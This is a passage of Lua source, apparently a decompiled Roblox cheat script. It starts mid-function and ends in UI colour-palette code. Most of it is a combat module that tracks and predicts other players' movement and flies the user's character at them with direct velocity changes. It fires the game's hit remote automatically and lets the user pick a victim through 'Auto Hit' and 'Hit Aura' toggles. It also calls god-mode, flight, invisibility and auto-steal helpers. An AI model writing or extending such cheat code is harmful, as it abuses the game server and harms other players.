							n27 = v20[v15] >= 0 and 1 or -1
						end

						local n28 = n25[v15] + n22

						if v19[v15] * n27 < n28 then
							local tbl20 = { X = v19.X, Y = v19.Y, Z = v19.Z, [v15] = n27 * n28 }
							arg2 = cFrame:PointToWorldSpace(Vector3.new(tbl20.X, tbl20.Y, tbl20.Z))
						end
					end
				end
			end

			return arg2
		end

		combat.KeepOffWalls = function(arg, arg2)
			local v14 = fn29(arg, arg2)
			local n25 = v14 - arg

			if n22 < n25.Magnitude then
				local v15 = arg

				for i = 1, 6 do
					local n26 = arg + n25 * i / n23
					local v16 = fn29(v15, n26)
					if (v16 - n26).Magnitude > 0.01 then
						return fn29(arg, v16)
					end
					v15 = v16
				end
			end

			return v14
		end

		combat.ResetWalls = function()
			table.clear(tbl17.WallSide)
		end

		local n25 = 0
		local v14 = nil

		local function fn30(arg)
			local character = localPlayer.Character

			if os.clock() - n25 > 0.5 or character ~= v14 then
				n25 = os.clock()
				v14 = character
				local filterDescendantsInstances = {}

				for _, player in ipairs(Players:GetPlayers()) do
					if player.Character then
						table.insert(filterDescendantsInstances, player.Character)
					end
				end

				raycastParams.FilterDescendantsInstances = filterDescendantsInstances
			end

			local hit = workspace:Raycast(arg + Vector3.new(0, 60, 0), Vector3.new(0, -400, 0), raycastParams)
			if hit and arg.Y < hit.Position.Y + n24 then
				return Vector3.new(arg.X, hit.Position.Y + n24, arg.Z)
			end
			return arg
		end

		local function fn31(arg, arg2)
			local tbl20 = tbl17.Tracks[arg]

			if not tbl20 then
				tbl20 = { Samples = {}, Smooth = nil, Heading = nil }
				tbl17.Tracks[arg] = tbl20
			end

			local now = os.clock()
			local samples = tbl20.Samples
			table.insert(samples, { Time = now, Position = arg2.Position })

			while #samples > 2 and now - samples[1].Time > n21 do
				table.remove(samples, 1)
			end

			local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
			local v15 = samples[1]
			local n26 = now - v15.Time

			if n26 >= 0.03 then
				local n27 = (arg2.Position - v15.Position) / n26

				if n27.Magnitude <= 1500 and assemblyLinearVelocity.Magnitude <= n27.Magnitude * 1.4 then
					assemblyLinearVelocity = n27
				end
			end

			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			tbl20.Smooth = tbl20.Smooth and tbl20.Smooth:Lerp(vector, 0.25) or vector
			local smooth = tbl20.Smooth

			if smooth.Magnitude > 1 then
				local heading = tbl20.Heading and tbl20.Heading:Lerp(smooth.Unit, 0.25) or smooth.Unit
				tbl20.Heading = heading.Magnitude > 0.01 and heading.Unit or smooth.Unit
			end

			return assemblyLinearVelocity, vector, smooth, tbl20
		end

		local function fn32()
			local n26 = 0

			for _, stat in ipairs(tbl17.Stats) do
				n26 += stat.Shots
			end

			local option = tbl17.Option
			local n27 = -math.huge

			for i, stat in ipairs(tbl17.Stats) do
				local n28 = stat.Shots + 1
				local n29 = (stat.Hits + 1) / (stat.Shots + 2) + math.sqrt(2 * math.log(n26 + 2) / n28) * 0.35

				if n29 > n27 then
					n27 = n29
					option = i
				end
			end

			tbl17.Option = option
			return option
		end

		local function fn33()
			local now = os.clock()

			for i = #tbl17.Pending, 1, -1 do
				local v15 = tbl17.Pending[i]
				local v16 = tbl17.Stats[v15.Option]

				if v15.RagdollBefore + 0.01 < fn22(v15.Target) then
					v16.Hits = v16.Hits + 1
					v16.Shots = v16.Shots + 1
					table.remove(tbl17.Pending, i)
				elseif v15.Wait < now - v15.At then
					if (v15.Tool and tonumber(v15.Tool:GetAttribute("CooldownEndTime")) or 0) > v15.CooldownBefore + 0.01 then
						v16.Shots = v16.Shots + 1
					end

					table.remove(tbl17.Pending, i)
				end
			end
		end

		combat.Plan = function(arg, arg2, arg3, arg4)
			if not arg3 then
				local v15
				v15, arg3 = combat.Parts(arg)
			end

			if not arg3 or not arg3.Parent then
				return nil
			end
			local n26 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n27 = math.clamp(n26 + n9, 0.05, 0.35)
			local v15, v16, v17, v18 = fn31(arg or arg3, arg3)
			local v19 = fn32()
			local v20 = tbl18[v19]
			local position = arg3.Position
			local n28 = position + v15 * math.max(0, v20 + n26 - n27)
			local n29 = position + v15 * (v20 + n26)
			local magnitude = v17.Magnitude
			local heading = v18.Heading

			if not heading then
				local vector = Vector3.new(arg2.Position.X - position.X, 0, arg2.Position.Z - position.Z)
				heading = vector.Magnitude > 0.1 and vector.Unit or Vector3.new(0, 0, 1)
			end

			local character = localPlayer.Character
			local v21 = combat.Range(character and combat.PickBat(character) or nil)
			local n30 = position + v17 * (n26 + v20 + n11 + n12) + (magnitude > 1 and v17.Unit * n14 * n13 or Vector3.zero)
			local n31 = math.max(5, math.min(v21 * 0.7, 6 + magnitude * 0.07)) * n13
			local now = os.clock()
			local n32 = (math.sin(now * 2 * 3.1415926535897931 / n15) * 0.5 + 0.5) * n31
			local n33 = math.sin(now * 2 * 3.1415926535897931 / n16) * n17
			local vector = Vector3.new(-heading.Z, 0, heading.X)

			if vector:Dot(arg2.Position - n30) < 0 then
				vector = -vector
			end

			local n34 = n30 + heading * n32 + vector * (v16.Magnitude < n20 and 3 or 1.5) + Vector3.new(0, n33, 0)
			local position2 = arg2.Position

			if not arg4 then
				position2 = combat.KeepOffWalls(arg2.Position, fn30(Vector3.new(n34.X, n34.Y, position.Z)))
			end

			return {
				Goal = position2,
				Velocity = Vector3.new(v17.X, 0, v17.Z),
				Face = n29,
				Current = n29,
				Historical = n28,
				Option = v19,
				Distance = (position - arg2.Position).Magnitude,
			}
		end

		combat.Steer = function(arg, arg2, arg3, arg4, arg5)
			local n26 = math.max(arg5, 0.0041666666666666666)
			local velocity = arg2.Velocity
			local n27 = velocity + (arg2.Goal - arg.Position) / math.max(0.12, n26)
			local n28 = math.min(arg3 + velocity.Magnitude, arg4)

			if n28 < n27.Magnitude then
				n27 = n27.Unit * n28
			end

			local position = arg.Position
			local n29 = position + n27 * n26
			local v15 = combat.KeepOffWalls(position, n29)

			if (v15 - n29).Magnitude > 0.01 then
				n27 = (v15 - position) / n26
			end

			local v16 = combat.KeepOffWalls(position, position)

			if (v16 - position).Magnitude > 0.01 then
				n27 = (v16 - position) / math.max(0.12, n26)
			end

			local assemblyLinearVelocity = n27 + Vector3.new(0, workspace.Gravity * n26 * 0.5, 0)

			pcall(function()
				local vector = Vector3.new(arg2.Face.X - position.X, 0, arg2.Face.Z - position.Z)

				if vector.Magnitude > 0.05 then
					arg.CFrame = CFrame.lookAt(position, position + vector.Unit)
				end

				arg.AssemblyLinearVelocity = assemblyLinearVelocity
				arg.AssemblyAngularVelocity = Vector3.zero
			end)
		end

		combat.TryHit = function(arg, arg2)
			fn33()
			if workspace:GetAttribute("PvPDisabled") == true then
				return "Player hits are off right now"
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local v15 = combat.Humanoid(character)
			if not humanoidRootPart or not v15 or v15.Health <= 0 then
				return "Waiting for your character"
			end
			local v16 = combat.PickBat(character)
			if not v16 then
				return "No bat found"
			end

			if not fn24(character, v15, v16) then
				return "Equipping " .. tostring(v16:GetAttribute("GearName") or v16.Name)
			end

			if not combat.Hittable(arg) or combat.Ragdolled(arg) then
				return nil
			end
			arg2 = arg2 or combat.Plan(arg, humanoidRootPart)
			if not arg2 then
				return nil
			end
			local n26 = combat.Range(v16) - n10
			local n27 = humanoidRootPart.Position - humanoidRootPart.AssemblyLinearVelocity * n11
			if (arg2.Historical - n27).Magnitude > n26 and (arg2.Current - n27).Magnitude > n26 then
				return nil
			end
			local v17 = fn21()
			if not v17 then
				return nil
			end
			local n28 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n29 = tonumber(v16:GetAttribute("CooldownEndTime")) or 0
			if fn20() < n29 - n28 * 0.5 then
				return nil
			end
			local lastFire = tbl17.LastFire
			if os.clock() - lastFire < math.max(0.12, n28 * 1.5) then
				return nil
			end
			tbl17.LastFire = os.clock()
			tbl17.Trace = tbl17.Trace + 1

			table.insert(tbl17.Pending, {
				Target = arg,
				Option = arg2.Option,
				At = os.clock(),
				Wait = math.max(0.5, n28 * 2 + 0.3),
				RagdollBefore = fn22(arg),
				CooldownBefore = n29,
				Tool = v16,
			})

			local str2 = string.format("%d:%d:%d", localPlayer.UserId, tbl17.Trace, math.floor(fn20() * 1000))

			pcall(function()
				v17:FireServer(arg, str2)
			end)

			return "Hitting " .. arg.DisplayName
		end

		combat.ReadyBat = function()
			local character = localPlayer.Character
			local v15 = combat.Humanoid(character)
			if not character or not v15 or v15.Health <= 0 then
				return false
			end
			local v16 = combat.PickBat(character)
			return v16 ~= nil and fn24(character, v15, v16)
		end

		combat.Swing = function()
			if tbl4.Steal.Active or tbl4.Steal.Carrying then
				return false
			end
			local lastFire = tbl17.LastFire
			local flag3 = os.clock() - lastFire < 0.3

			if not flag3 then
				flag3 = os.clock() - (tbl17.LastSwing or 0) < 0.15
			end

			if flag3 then
				return false
			end
			local character = localPlayer.Character
			local v15 = combat.Humanoid(character)
			if not character or not v15 or v15.Health <= 0 then
				return false
			end
			local v16 = combat.PickBat(character)
			if not v16 or not fn24(character, v15, v16) then
				return false
			end
			tbl17.LastSwing = os.clock()

			pcall(function()
				v16:Activate()
			end)

			return true
		end

		combat.HolderOf = function(arg)
			local v15 = workspace:FindFirstChild(arg)
			if not v15 then
				return nil
			end

			for _, descendant in ipairs(v15:GetDescendants()) do
				if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok then
						for _, v16 in ipairs({ result, result2 }) do
							if typeof(v16) == "Instance" and not v16:IsDescendantOf(v15) then
								local model = v16:FindFirstAncestorOfClass("Model")

								if model then
									model = Players:GetPlayerFromCharacter(model) or Players:FindFirstChild(model.Name)
								end

								model = model or nil
								if model and model ~= localPlayer and model:IsA("Player") then
									return model
								end
							end
						end
					end
				end
			end

			return nil
		end

		task.spawn(function()
			while not tbl4.CombatDisposed do
				local holders = {}

				if tbl4.CombatWantsHolders then
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
						local ok, result = pcall(eggState.ReadFieldEggs)
						local records = ok and type(result) == "table" and result.Records or nil

						if type(records) == "table" then
							for _, record in pairs(records) do
								if type(record) == "table" and record.State == "Carried" and type(record.Uid) == "string" then
									local v15 = combat.HolderOf(record.Uid)

									if v15 then
										holders[v15] = true
									end
								end
							end
						end
					end
				end

				tbl17.Holders = holders
				task.wait(0.3)
			end
		end)

		combat.IsHolder = function(arg)
			return tbl17.Holders[arg] == true
		end

		local tbl20 = {}

		combat.OnNewLife = function(arg)
			table.insert(tbl20, arg)
		end

		local function fn34()
			table.clear(tbl17.Pending)
			tbl17.LastFire = 0
			tbl17.LastSwing = 0
			tbl17.EquipAt = 0
			table.clear(tbl17.Tracks)
			table.clear(tbl17.WallSide)
			tbl17.SpawnRagdoll = fn22(localPlayer)

			for _, v15 in ipairs(tbl20) do
				pcall(v15)
			end
		end

		local characterAdded = localPlayer.CharacterAdded
		local connect = characterAdded.Connect
		local tbl21 = { localPlayer.CharacterRemoving:Connect(fn34), connect(characterAdded, fn34) }

		fn4(function()
			tbl4.CombatDisposed = true

			for _, v15 in ipairs(tbl21) do
				pcall(function()
					v15:Disconnect()
				end)
			end
		end)
	end

	do
		local combat2 = tbl4.Combat
		local tbl18 = { "Nearest", "Egg Holders", "Specific Player" }
		local n18 = 0.7
		local str2 = "No other players"

		local tbl19 = {
			Handles = {},
			AuraHandle = nil,
			Row = nil,
			Picker = nil,
			TargetMode = tbl18[1],
			Picked = nil,
			LabelToName = {},
			Speed = 400,
			MaxSpeed = 750,
			Target = nil,
			Plan = nil,
			Moving = false,
			Status = "Idle",
			Shown = nil,
			NamesDirty = true,
		}

		local function fn20()
			for i, v14 in ipairs(tbl18) do
				if tbl4.Toggle(tbl19.Handles[i], false) then
					return v14
				end
			end

			return nil
		end

		local function fn21()
			return tbl4.Toggle(tbl19.AuraHandle, false) == true
		end

		tbl4.CombatActive = function()
			return fn20() ~= nil or fn21()
		end

		local function fn22(arg)
			if not combat2.Hittable(arg) then
				return false
			end

			if tbl19.TargetMode == tbl18[2] then
				return combat2.IsHolder(arg)
			end

			if tbl19.TargetMode == tbl18[3] then
				return tbl19.Picked ~= nil and arg.Name == tbl19.Picked
			end
			return true
		end

		local function fn23(arg)
			local target = tbl19.Target
			local magnitude

			if target and fn22(target) then
				local v14, v15 = combat2.Parts(target)
				magnitude = (v15.Position - arg).Magnitude
			else
				target = nil
				magnitude = math.huge
			end

			local huge = math.huge
			local v14 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= target and fn22(player) and not combat2.Ragdolled(player) then
					local v15, v16 = combat2.Parts(player)
					local magnitude2 = (v16.Position - arg).Magnitude

					if magnitude2 < huge then
						huge = magnitude2
						v14 = player
					end
				end
			end

			if target then
				if v14 and not combat2.Ragdolled(target) and huge < magnitude * n18 then
					return v14
				end
				return target
			end

			return v14
		end

		local function fn24(arg, arg2)
			local v14 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local character = player.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						local magnitude = (character.Position - arg).Magnitude

						if magnitude < arg2 and combat2.Hittable(player) and not combat2.Ragdolled(player) then
							arg2 = magnitude
							v14 = player
						end
					end
				end
			end

			return v14, arg2
		end

		local function fn25()
			tbl19.Plan = nil

			if tbl19.Moving then
				tbl19.Moving = false
				tbl4.EndFlight()
				tbl4.GodMode(false)
				tbl4.Shield("combat", false)
				combat2.ResetWalls()
			end

			tbl4.ReleaseMovement("combat")
		end

		combat2.OnNewLife(function()
			tbl19.AuraVictim = nil
			tbl19.Target = nil
			tbl19.Plan = nil
			pcall(fn25)
		end)

		local function fn26()
			local movement = tbl4.Movement
			return tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Steal.Wanted and tbl4.Toggle(v4, false) or movement.Owner ~= nil and movement.Owner ~= "combat" and movement.Owner ~= "treadmill"
		end

		local function fn27(arg)
			local character = localPlayer.Character
			local n19 = combat2.Range(character and combat2.PickBat(character) or nil) + 6
			local v14, v15 = fn24(arg.Position, n19 + 24)

			if not v14 or v15 > n19 then
				tbl19.AuraVictim = nil

				if v14 then
					combat2.ReadyBat()
				end

				tbl19.Status = "Aura ready, nobody in reach"
				return
			end

			tbl19.AuraVictim = v14
			tbl19.Status = combat2.TryHit(v14, combat2.Plan(v14, arg, nil, true)) or "Aura on " .. v14.DisplayName
		end

		local function fn28()
			local v14 = fn20()

			if v14 and v14 ~= tbl19.TargetMode then
				tbl19.TargetMode = v14
				tbl19.Target = nil
			end

			tbl4.CombatWantsHolders = v14 == tbl18[2]
			local v15 = fn21()
			local flag3 = not v14

			if flag3 then
				if tbl19.Target or tbl19.Moving then
					tbl19.Target = nil
					fn25()
				end
			end

			if flag3 and not v15 then
				tbl19.Status = "Idle"
				return
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local v16 = combat2.Humanoid(character)

			if not humanoidRootPart or not v16 or v16.Health <= 0 then
				tbl19.Target = nil
				fn25()
				tbl19.Status = "Waiting for your character"
				return
			end

			if flag3 then
				fn27(humanoidRootPart)
				return
			end
			local v17 = fn23(humanoidRootPart.Position)
			tbl19.Target = v17

			if not v17 then
				fn25()
				if v15 then
					fn27(humanoidRootPart)
					return
				end
				tbl19.Status = v14 == tbl18[2] and "Waiting for someone to hold an egg" or v14 == tbl18[3] and "Picked player is not reachable" or "No player to hit"
				return
			end

			local plan = combat2.Plan(v17, humanoidRootPart)
			local flag4 = v14 ~= tbl18[2]

			if not fn26() and (flag4 or not combat2.SelfRagdolled()) and tbl4.ClaimMovement("combat") and not tbl4.AntiGuard.Busy then
				if not tbl19.Moving then
					tbl19.Moving = true
					tbl4.Shield("combat", true)
					tbl4.GodMode(true)
					tbl4.BeginFlight()
				end

				tbl4.GodTick()
				tbl19.Plan = plan
			else
				if tbl19.Moving then
					fn25()
				end

				tbl19.Plan = nil
			end

			local v18 = combat2.TryHit(v17, plan, flag4)
			plan = plan and math.floor(plan.Distance + 0.5) or 0

			if v18 then
				tbl19.Status = v18 .. string.format("  %d studs", plan)
			elseif fn26() then
				tbl19.Status = string.format("Waiting for Auto Steal, near %s", v17.DisplayName)
			else
				tbl19.Status = string.format("Chasing %s  %d studs", v17.DisplayName, plan)
			end
		end

		local function fn29()
			local tbl20 = {}

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(tbl20, player)
				end
			end

			table.sort(tbl20, function(arg, arg2)
				return string.lower(arg.DisplayName) < string.lower(arg2.DisplayName)
			end)

			local tbl21 = {}

			for _, v14 in ipairs(tbl20) do
				tbl21[v14.DisplayName] = (tbl21[v14.DisplayName] or 0) + 1
			end

			local tbl22 = {}
			local tbl23 = {}

			for _, v14 in ipairs(tbl20) do
				local displayName = v14.DisplayName

				if tbl21[displayName] > 1 then
					displayName = string.format("%s (@%s)", v14.DisplayName, v14.Name)
				end

				table.insert(tbl22, displayName)
				tbl23[displayName] = v14.Name
			end

			if #tbl22 == 0 then
				tbl22[1] = str2
			end

			return tbl22, tbl23
		end

		local function fn30(arg)
			for k, v14 in pairs(tbl19.LabelToName) do
				if v14 == arg then
					return k
				end
			end

			return nil
		end

		local connection = RunService.PreSimulation:Connect(function(deltaTime)
			local plan = tbl19.Plan
			if not plan or not tbl19.Moving then
				return
			end
			local v14 = tbl4.Root()

			if v14 then
				combat2.Steer(v14, plan, tbl19.Speed, math.max(tbl19.Speed, tbl19.MaxSpeed), deltaTime)
			end
		end)

		local n19 = 0.05
		local n20 = 0

		local connection2 = RunService.Heartbeat:Connect(function()
			local flag3 = fn20() ~= nil
			local v14 = fn21()

			if not v14 then
				tbl19.AuraVictim = nil
			end

			local now = os.clock()

			if flag3 or not v14 or now >= n20 then
				if v14 and not flag3 then
					n20 = now + n19
				end

				if not pcall(fn28) then
					tbl19.Status = "Retrying"
				end
			end

			if flag3 or v14 and tbl19.AuraVictim ~= nil then
				pcall(combat2.Swing)
			end

			local row = tbl19.Row

			if row and tbl19.Shown ~= tbl19.Status and type(row.Set) == "function" then
				tbl19.Shown = tbl19.Status
				pcall(row.Set, row, tbl19.Status)
			end

			local picker = tbl19.Picker

			if tbl19.NamesDirty and picker and type(picker.SetOptions) == "function" then
				tbl19.NamesDirty = false
				local v15, v16 = fn29()
				tbl19.LabelToName = v16
				pcall(picker.SetOptions, picker, v15, tbl19.Picked and fn30(tbl19.Picked) or v15[1], false)
			end
		end)

		local connection3 = Players.PlayerAdded:Connect(function()
			tbl19.NamesDirty = true
		end)

		local connection4 = Players.PlayerRemoving:Connect(function(player)
			tbl19.NamesDirty = true

			if tbl19.Target == player then
				tbl19.Target = nil
			end
		end)

		fn4(function()
			for _, v14 in ipairs({ connection, connection2, connection3, connection4 }) do
				pcall(function()
					v14:Disconnect()
				end)
			end

			tbl19.Target = nil
			fn25()
		end)

		local function fn31(arg, arg2)
			if tbl4.Toggle(arg, false) and tbl4.Toggle(tbl4.InvisibilityHandle, false) then
				tbl4.UiDefer(function()
					pcall(arg.Set, arg, false, false)
					tbl4.Notify(arg2, "Turn off Invisibility first, both cannot be on at the same time")
				end)

				return true
			end

			return false
		end

		tbl19.Row = v12:CreateText({ Name = "Hit Status", Text = "Idle" })
		local v14 = v2:CreateExclusiveGroup({ Name = "Chilli Combat Targets", MaxActive = 1 })

		for i, v15 in ipairs({ "Auto Hit Nearest Player", "Auto Hit Egg Holders", "Auto Hit Specific Player" }) do
			local v16 = nil

			v16 = v12:CreateToggle({
				Name = v15,
				Default = false,
				Callback = function()
					fn31(v16, v15)
				end,
			})

			pcall(v16.JoinExclusiveGroup, v16, v14)
			tbl19.Handles[i] = v16
		end

		local v15, v16 = fn29()
		tbl19.LabelToName = v16

		tbl19.Picker = v12:CreateDropdown({
			Name = "Hit Player",
			Options = v15,
			Default = v15[1],
			SubOf = tbl19.Handles[3],
			Callback = function(arg)
				tbl19.Picked = tbl19.LabelToName[tostring(arg)]
				tbl19.Target = nil
			end,
		})

		tbl19.AuraHandle = v12:CreateToggle({
			Name = "Hit Aura",
			Default = false,
			Callback = function()
				fn31(tbl19.AuraHandle, "Hit Aura")
			end,
		})

		pcall(tbl19.AuraHandle.JoinExclusiveGroup, tbl19.AuraHandle, v14)
		local v17 = v12:CreateLabel({ Name = "Chase Settings", Text = "Chase Settings" })

		v12:CreateSlider({
			Name = "Hit Tween Speed",
			SubOf = v17,
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				tbl19.Speed = math.clamp(tonumber(arg) or 400, 100, 1000)
			end,
		})

		v12:CreateSlider({
			Name = "Hit Max Speed",
			SubOf = v17,
			Min = 100,
			Max = 1000,
			Default = 750,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				tbl19.MaxSpeed = math.clamp(tonumber(arg) or 750, 100, 1000)
			end,
		})

		v12:CreateSlider({
			Name = "Hit Lead",
			SubOf = v17,
			Note = "Stand further ahead of the target (+) or closer to them (-)",
			Min = -400,
			Max = 100,
			Default = -275,
			Increment = 1,
			Callback = function(arg)
				combat2.SetLead(arg)
			end,
		})

		v12:CreateSlider({
			Name = "Hit Sweep",
			SubOf = v17,
			Note = "How far you move back and forth in front of the target",
			Min = 0,
			Max = 250,
			Default = 60,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				combat2.SetSweep(arg)
			end,
		})

		local n21 = 2
		local v18 = nil

		local function fn32()
			local getState = v2.GetState
			return v2:GetState("Quick Pinned Features"), getState(v2, "Quick Pin Groups")
		end

		local function fn33()
			local tbl20 = {}

			for _, v19 in ipairs({ tbl19.Handles[1], tbl19.Handles[2], tbl19.AuraHandle }) do
				local ok, result = pcall(function()
					return v19:GetQuickPath()
				end)

				if ok and type(result) == "string" then
					table.insert(tbl20, result)
				end
			end

			return tbl20
		end

		local function fn34()
			local v19, v20 = fn32()
			if not v19 or not v20 then
				return false
			end
			local v21 = v19:Get()
			local v22 = v20:Get()
			if type(v21) ~= "table" or type(v22) ~= "table" then
				return false
			end
			local v23 = fn33()
			if #v23 == 0 then
				return false
			end

			for _, v24 in ipairs(v23) do
				if not table.find(v21, v24) or tonumber(v22[v24]) ~= n21 then
					return false
				end
			end

			return true
		end

		local function fn35()
			if v18 and type(v18.SetActionText) == "function" then
				pcall(v18.SetActionText, v18, fn34() and "Remove" or "Add")
			end
		end

		local function fn36()
			local v19, v20 = fn32()
			if not v19 or not v20 then
				tbl4.Notify("Quick Bar", "The Quick Bar is not ready yet, try again in a moment")
				return
			end
			local v21 = fn34()
			local tbl20 = {}
			local tbl21 = {}
			local v22 = v19:Get()

			if type(v22) == "table" then
				for i, v23 in ipairs(v22) do
					tbl20[i] = v23
				end
			end

			local v23 = v20:Get()

			if type(v23) == "table" then
				for k, v24 in pairs(v23) do
					tbl21[k] = v24
				end
			end

			for _, v24 in ipairs(fn33()) do
				local v25 = table.find(tbl20, v24)

				if v21 then
					if v25 then
						table.remove(tbl20, v25)
					end

					tbl21[v24] = nil
				else
					tbl21[v24] = n21

					if not v25 then
						table.insert(tbl20, v24)
					end
				end
			end

			v20:Set(tbl21)
			v19:Set(tbl20)
			fn35()
			tbl4.Notify("Quick Bar", v21 and "Removed the hit toggles from Quick Bar 2" or "Added the hit toggles to Quick Bar 2")
		end

		v18 = v12:CreateButton({
			Name = "Add/Remove Hits On Quick Bar 2",
			Note = "Pin or unpin the hit toggles on Quick Bar 2",
			ButtonText = "Add",
			ConfirmText = "Done!",
			Callback = function()
				tbl4.UiDefer(fn36)
			end,
		})

		task.delay(3, function()
			tbl4.UiDefer(fn35)
		end)
	end

	espSection = tbl4.EspSection

	local function fn20(arg, arg2)
		local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
		return ok and result or nil
	end

	tbl5 = {
		MainFont = fn20("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		StatusFont = fn20("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
		Sequence = function(arg)
			local v14 = table.create(#arg)

			for i, v15 in ipairs(arg) do
				v14[i] = ColorSequenceKeypoint.new(v15[1], v15[2])
			end

			return ColorSequence.new(v14)
		end,
	}

	color = Color3.fromRGB
	sequence = tbl5.Sequence
	palettes = {}

	do
		local gold = {}
		local tbl18 = {}
		local tbl19 = { 0, color(255, 231, 158) }
		local tbl20 = { 0.4, color(255, 196, 66) }
		local tbl21 = { 1, color(214, 142, 12) }
		tbl18[1] = tbl19
		tbl18[2] = tbl20
		tbl18[3] = tbl21
		gold.Text = sequence(tbl18)
		local tbl22 = {}
		local tbl23 = { 0, color(122, 76, 0) }
		local tbl24 = { 0.55, color(62, 38, 0) }
		local tbl25 = { 1, color(20, 12, 0) }
		tbl22[1] = tbl23
		tbl22[2] = tbl24
		tbl22[3] = tbl25
		gold.Stroke = sequence(tbl22)
		gold.Outline = color(255, 232, 152)
		palettes.Gold = gold
	end

	do
		local orange = {}
		local tbl18 = {}
		local tbl19 = { 0, color(255, 198, 132) }
		local tbl20 = { 0.4, color(255, 146, 40) }
		local tbl21 = { 1, color(206, 92, 0) }
		tbl18[1] = tbl19
		tbl18[2] = tbl20
		tbl18[3] = tbl21
		orange.Text = sequence(tbl18)
		local tbl22 = {}
		local tbl23 = { 0, color(112, 54, 0) }
		local tbl24 = { 0.55, color(56, 27, 0) }
		local tbl25 = { 1, color(18, 8, 0) }
		tbl22[1] = tbl23
		tbl22[2] = tbl24
		tbl22[3] = tbl25
		orange.Stroke = sequence(tbl22)
		orange.Outline = color(255, 194, 112)
		palettes.Orange = orange
	end

	red = {}

	do
		local tbl18 = {}
		local tbl19 = { 0, color(255, 105, 105) }
		local tbl20 = { 0.4, color(255, 28, 40) }
		local tbl21 = { 1, color(184, 0, 18) }
		tbl18[1] = tbl19
		tbl18[2] = tbl20
		tbl18[3] = tbl21
		red.Text = sequence(tbl18)
	end
end

local v6, v7, v8, tbl6

do
	local n3, n4, n5, tbl7, n6, n7, n8, n9, n10, n11
	local tweenInfo, tweenInfo2, tweenInfo3, tweenInfo4, tweenInfo5, TweenService, color2, fn8, tbl8

	do
		do
			local tbl9 = {}
			local tbl10 = { 0, color(124, 0, 15) }
			local tbl11 = { 0.55, color(61, 0, 9) }
			local tbl12 = { 1, color(18, 0, 3) }
			tbl9[1] = tbl10
			tbl9[2] = tbl11
			tbl9[3] = tbl12
			red.Stroke = sequence(tbl9)
		end

		red.Outline = color(255, 128, 138)
		palettes.Red = red

		do
			local accent = {}
			local tbl9 = {}
			local tbl10 = { 0, color(170, 255, 160) }
			local tbl11 = { 0.45, color(58, 255, 55) }
			local tbl12 = { 1, color(20, 109, 0) }
			tbl9[1] = tbl10
			tbl9[2] = tbl11
			tbl9[3] = tbl12
			accent.Text = sequence(tbl9)
			local tbl13 = {}
			local tbl14 = { 0, color(10, 52, 6) }
			local tbl15 = { 1, color(3, 16, 0) }
			tbl13[1] = tbl14
			tbl13[2] = tbl15
			accent.Stroke = sequence(tbl13)
			accent.Outline = color(58, 255, 55)
			palettes.Accent = accent
		end

		do
			local sheen = {}
			local tbl9 = {}
			local tbl10 = { 0, color(255, 255, 255) }
			local tbl11 = { 0.5, color(222, 222, 222) }
			local tbl12 = { 1, color(255, 255, 255) }
			tbl9[1] = tbl10
			tbl9[2] = tbl11
			tbl9[3] = tbl12
			sheen.Text = sequence(tbl9)
			local tbl13 = {}
			local tbl14 = { 0, color(8, 8, 8) }
			local tbl15 = { 1, color(8, 8, 8) }
			tbl13[1] = tbl14
			tbl13[2] = tbl15
			sheen.Stroke = sequence(tbl13)
			sheen.Outline = color(255, 255, 255)
			palettes.Sheen = sheen
		end

		tbl5.Palettes = palettes

		tbl5.PaletteFromColor = function(arg)
			local color3 = Color3.new(1, 1, 1)
			local color4 = Color3.new(0, 0, 0)
			local tbl9 = {}
			local sequence2 = tbl5.Sequence
			local tbl10 = {}
			local tbl11 = { 0, arg:Lerp(color3, 0.5) }
			local tbl12 = { 0.4, arg:Lerp(color3, 0.1) }
			local tbl13 = { 1, arg:Lerp(color4, 0.25) }
			tbl10[1] = tbl11
			tbl10[2] = tbl12
			tbl10[3] = tbl13
			tbl9.Text = sequence2(tbl10)
			local sequence3 = tbl5.Sequence
			local tbl14 = {}
			local tbl15 = { 0, arg:Lerp(color4, 0.55) }
			local tbl16 = { 0.55, arg:Lerp(color4, 0.75) }
			local tbl17 = { 1, arg:Lerp(color4, 0.92) }
			tbl14[1] = tbl15
			tbl14[2] = tbl16
			tbl14[3] = tbl17
			tbl9.Stroke = sequence3(tbl14)
			tbl9.Outline = arg:Lerp(color3, 0.25)
			return tbl9
		end

		tbl5.SizeScale = 1
		local tbl9 = {}

		tbl5.OnSizeChanged = function(arg)
			table.insert(tbl9, arg)
		end

		tbl5.SetSizeScale = function(sizeScale)
			if tbl5.SizeScale == sizeScale then
				return
			end
			tbl5.SizeScale = sizeScale

			for _, v9 in ipairs(tbl9) do
				pcall(v9)
			end
		end

		tbl5.RowHeight = function(arg)
			local currentCamera = workspace.CurrentCamera
			return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (arg or tbl5.SizeScale)))
		end

		tbl5.ScaledWidth = function(arg, arg2)
			return math.max(30, math.floor(arg * (arg2 or tbl5.SizeScale)))
		end

		tbl5.CreateRuntime = function()
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
